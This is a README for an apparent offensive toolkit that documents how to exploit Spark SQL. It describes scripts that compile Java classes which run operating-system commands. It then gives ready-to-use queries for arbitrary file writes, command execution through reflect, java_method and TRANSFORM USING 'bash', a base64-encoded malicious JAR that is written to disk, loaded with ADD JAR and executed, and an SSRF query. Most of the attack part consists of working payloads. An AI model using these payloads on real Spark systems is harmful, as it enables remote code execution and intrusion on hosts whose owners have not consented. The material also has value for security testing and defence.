# Spark SQL Hacking

This repository contains quick notes, proof-of-concept queries, and snippets for exploiting Spark SQL environments.  
These examples leverage the `reflect` and `java_method` functions, as well as custom JAR loading, to perform file writes, remote code execution (RCE), and other behaviors.


## Script Descriptions

### build_class.sh
Generates and compiles a Java class (`exploit.ExecOnLoad`) whose static initializer executes an operating system command (`touch /tmp/pwned_by_class`) upon class loading.  
The script packages the compiled class into `./output_classes/exploit.jar` without specifying a `Main-Class` attribute, making it suitable for classpath-based loading in Spark SQL or other JVM contexts to trigger code execution when the class is referenced.

### build_custom_jar.py
Creates, compiles, and packages a Java class (`pwn.Pwn`) that executes arbitrary operating system commands on both Windows and Unix-like platforms.  
The script outputs Spark SQL statements that can:
1. Write the JAR to the Spark host using `java.nio.file.Files.write` with `unbase64`.
2. Load the JAR into Spark via `ADD JAR`.
3. Invoke the `pwn.Pwn.exec` method to run a specified command.  

### install_fernflower.sh
Automates the installation of JetBrains' Fernflower Java decompiler.  
It clones the IntelliJ Community Edition repository, builds the Fernflower engine with Gradle, copies the resulting JAR to `/usr/bin/fernflower.jar`, and installs a wrapper script `/usr/bin/fernflower` to simplify usage.  
Requires root privileges, Java, and Git. Once installed, `fernflower` can be used to decompile `.jar` files.
Deletes the repo when completed and only leaves fernflower.jar behind

### mass_decompile.sh
Performs bulk decompilation of `.jar` files using Fernflower with parallel processing.  
Logs the status of each decompilation to `/tmp/decompilation_results.txt` with reasons for failures (e.g., `TIMEOUT`, `EXIT_CODE`, `NO_OUTPUT`, `EXTRACT_FAILED`, `KILLED_OR_OOM`).  
Supports worker mode for decompiling individual files and main mode for batch processing.  
Includes timeout handling, file locking, and cleans up temporary directories automatically.


## Regexes

Helper command to search for potential Java static methods that accept `String` parameters (useful for RCE or file write vectors):

```
grep -hrP 'public\s+static\s+.*\([^)]*\bString(?!\s*\[)' . | grep command
```

## File Write

Example using `org.antlr.v4.runtime.misc.Utils.writeFile` to write arbitrary content to a file:

```
SELECT reflect('org.antlr.v4.runtime.misc.Utils', 'writeFile', '/tmp/urmum3', 'i <3 2 hack');
```

## Code Execution

Methods to trigger OS command execution:

### Using Spark internal utilities
```
SELECT java_method( 'org.apache.spark.util.Utils', 'checkCommandAvailable', 'ls; touch /tmp/urmum666');
```


### Transform-based execution
```
SELECT transform(*) USING 'bash' FROM values('ls /tmp/');
```

### Load class that executes on load
```
SELECT reflect('org.apache.logging.log4j.core.util.Loader', 'loadSystemClass', 'ExecOnLoad');
```

### Load Custom JAR
```
SELECT reflect('java.nio.file.Files','write',reflect('java.nio.file.Paths','get','/tmp/pwn_26594.jar'),unbase64('UEsDBBQAAAAIAFZiCVueivF8NwAAADUAAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUbzTczLTEstLtENSy0qzszPs1Iw1DPg5XIuSk0sSU3Rdaq0UgioLMnIz1OIyixIy8xJ5eXi5QIAUEsDBBQAAAAIAFZiCVucE0HelwMAAPQFAAANAAAAcHduL1B3bi5jbGFzc31US3PTVhT+bqxYihAhUZyQlEfCK/iBLZqWPgiPQprQUCe4cWrqpLTI0k0QtSVXlnHYsu6+05kOsGgna7pwMmXKsgt+DL8gUzhXdh6eetDiSvec73z3Ow/d1//9/QrAVayp6EFEhqShF1GGgYfmI9Mom+66caf0kFsBQ/SK4zrBNYZIPFFQoDDIXi3jmhWuQsUhGZqGw+jviM0/rgW8wnBonQc536tyP3jMMBnPHoAEvuOuTyf+b1IxgEEZuoYhxDppQwDRBl7Wa3B/xqxxhli8C4mCEVLccFzBNqphDB8wKJbnBqbj1hiOHdQy88D08/znOnctPp1YUXEcJ2Sc1DCOCYbBfeBS3Q2cCp2pUmJ7m+EOAW0zKThNpbIqdoZvcAVnGXoMS1BPajiPOINEdoshHl99f1mogBav1YgwSYRGyXGN2gMFF4gwbcnIMIyEYMczbtbX1rjP7SVu2tyXcZFhbNc371brAdFzs9Jyq5jCRzI+1nAJn3Sk2T6RoZ/SPBDHcHQ31U5C6pmBz8QMfc4wGu8KSRRUpDEtQFcYhvZBLTVt/zUN10XXFYqxs47L+2jIbmi4iRnqp1engRzei8xRrfYVzGJOxi0NX2Ge+LtgqHpVsSu7omddil4QJflaQ1bUQ+Q+6/ue3woWOhY13Al1cD+s3jcalpAn2obpBHOeH/4j8zK+3T0/ZJ/dsHg1cDwaxWXc1fCd+NGOVFu6TOunZd+0aEBWqAWrqXsTFc+ul/lE2aOq2Cq+xz0ZP4iRmRf6G66Ra5B+acazafSOiBIt1isl7i+bpTJZDoecC2a1vZcqNPA0Il2nrECTnPfqvsXnHAFWiDsjYDhFB/dAPBEwcTfQ+iPtTtCb0bs3uQX2gj4Y7tMaDY1R9AmdLSi7RGG9ZP1Tl7fR1yStKX24iaO/YXwbx6L/YKAY0U/li5J+Jl/sTeabOLewieP7voTwpfZ8L5EuvoRRvNDEh1v4dAuXF9NNXC1elv5F/1/4Ykxq4svNt28O4G53wS3s4sifu7sJJZtqovAiTOB3PKMe9YQpzWGQVpVS0qCjHxna38IwchjBCkZh053i0e+8QTV5gpP4hW6LX3GaOM4Ryxk8x1n8gUmYxJKEsoOMjIEdjMqY2oEuI72DGFn02FvIYPQllmWJzivBalf7BmkRumKUnl4k2clXT9GXjExtY1UUv6VUh0RrAnRB0E2comszHZ5KnRuicDsE8ndQSwECFAMUAAAACABWYglbnorxfDcAAAA1AAAAFAAAAAAAAAAAAAAAgAEAAAAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwECFAMUAAAACABWYglbnBNB3pcDAAD0BQAADQAAAAAAAAAAAAAAgAFpAAAAcHduL1B3bi5jbGFzc1BLBQYAAAAAAgACAH0AAAArBAAAAAA='));
ADD JAR '/tmp/pwn_26594.jar';
SELECT java_method('pwn.Pwn', 'exec', '/bin/rm /tmp/pwn_26594.jar');

```

### SSRF
```
SELECT reflect('javassist.URLClassPath', 'fetchClass', '127.0.0.1', 80, '/', 'url-path');
```
